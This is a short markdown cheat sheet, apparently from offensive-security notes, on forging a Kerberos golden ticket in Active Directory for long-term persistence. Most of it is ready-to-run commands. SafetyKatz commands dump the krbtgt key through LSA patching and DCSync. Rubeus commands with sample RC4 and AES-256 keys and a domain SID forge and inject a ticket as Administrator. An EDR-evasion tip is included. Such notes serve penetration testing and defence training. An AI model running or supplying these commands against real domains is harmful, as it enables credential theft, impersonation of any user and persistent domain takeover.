>**ℹ️ Info:**
> Useful for long term persistance being able to impersonate any user on domain and non-domain computers.
---
# Methodology
>1. Retrieve the AES-256 key of the `krbtgt` account.
>2. Forge and inject the ticket.
>3. Impersonate any user.

---
# Binaries
>**ℹ️ Info:**
>
> Remember to follow the [binaries methodology](../00%20-%20Miscellaneous/01-%20Methodology.md#Binaries).

## SafetyKatz

**Retrieve the AES-256 key of the `krbtgt` account:**
```cmd
SafetyKatz.exe '"lsadump::lsa /patch"'
SafetyKatz.exe '"lsadump::dcsync /user:contoso\krbtgt"'
```

## Rubeus
**Forge a golden ticket with similar attributes to a normal TGT:**
```cmd
# With an NTLM hash (Usually flagged by EDRs)
Rubeus.exe golden 
/rc4:32ED87BDB5FDC5E9CBA88547376818D4 /sid:S-1-5-21-210670787-2521448726-163245708 /ldap /user:Administrator /printcmd /ptt

# With an AES-256 key (Admin cmd required)
Rubeus.exe golden 
/aes256:5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5 /sid:S-1-5-21-210670787-2521448726-163245708 /ldap /user:Administrator /printcmd /ptt
```

>**ℹ️ Info:**
>We use the domain SID in this case to avoid Rubeus getting confused when in a multi-domain enviroment.